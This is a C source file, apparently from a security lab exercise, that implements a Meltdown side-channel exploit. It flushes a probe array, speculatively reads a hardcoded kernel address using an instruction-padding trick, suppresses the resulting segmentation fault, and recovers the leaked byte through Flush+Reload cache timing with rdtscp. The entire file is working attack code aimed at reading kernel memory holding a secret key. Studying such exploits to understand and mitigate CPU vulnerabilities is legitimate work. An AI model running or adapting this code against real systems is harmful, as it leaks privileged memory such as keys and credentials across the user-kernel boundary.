/*
Verify the out of order execution
*/
#include<stdio.h>
#include<signal.h>
#include<emmintrin.h>
#include<time.h>
#include<stdint.h>
#include<setjmp.h>
#include<unistd.h>
#include<fcntl.h>
#include<x86intrin.h>

#define DELTA 1024
#define CACHE_HIT_THRESHOLD 150

static sigjmp_buf jbuf;
uint8_t array[256*4096];

// Flush + Reload
void flushChannel(){
    int i;
    for(i=0;i<256;i++) array[i*4096 + DELTA] = 1;

    for(i=0;i<256;i++) _mm_clflush(&array[i*4096 + DELTA]);
}

// Uses timespec
void attackChannel(){
    int i, k, temp;

    uint64_t diff;
    volatile uint8_t *addr;
    double min  = 10000000;
    struct timespec start, end;

    for(i=0;i<256;i++){
        addr = &array[i*4096 + DELTA];
        clock_gettime(CLOCK_MONOTONIC, &start);
        temp = *addr;
        clock_gettime(CLOCK_MONOTONIC, &end);
        diff = end.tv_nsec - start.tv_nsec;
        if(diff<=min){
            min = diff;
            k=i;
        }
    }
    if(min<600)
        printf("Accessed element : array[%d*4096+DELTA]\n", k);
}

// Uses rdtscp
void attackChannel_x86(){
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    int temp, i;
    for(i=0;i<256;i++){
        time1 = __rdtscp(&temp);
        temp = array[i*4096 + DELTA];
        time2 = __rdtscp(&temp) - time1;
        if(time2<=CACHE_HIT_THRESHOLD)
        {
            printf("array[%d*4096+DELTA]\n", i);
        }
    }
}

// Out of order execution
int meltdown(unsigned long kernel_addr){
    // int key = 95;
    
    // Cache the data to improve success
    int fd = open("/proc/my_secret_key", O_RDONLY);
    if(fd<0){
        perror("open");
        return -1;
    }
    int ret = pread(fd, NULL, 0, 0);    //Data is cached


    char data = *(char*) kernel_addr;   //Raises exception
    array[data*4096+DELTA] += 10;
}

//Improve the attack with arithmetic instruction
void meltdown_with_asm(unsigned long kernel_addr){
    char kernel_data;

    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"
        
        :
        :
        :"eax"
    );

    kernel_data = *(char*)kernel_addr;
    array[kernel_data*4096 + DELTA] +=10;
}
void catch_segv(){
    siglongjmp(jbuf, 1);
}

int main(){
    unsigned long kernel_addr = 0xfab3b024;
    signal(SIGSEGV, catch_segv);

    int fd = open("/proc/my_secret_key", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    flushChannel();
    
    if(sigsetjmp(jbuf, 1)==0)
    {
        // meltdown(kernel_addr);
        meltdown_with_asm(kernel_addr);
    }
    else{
        printf("Memory Access Violation\n");
    }

    attackChannel_x86();
}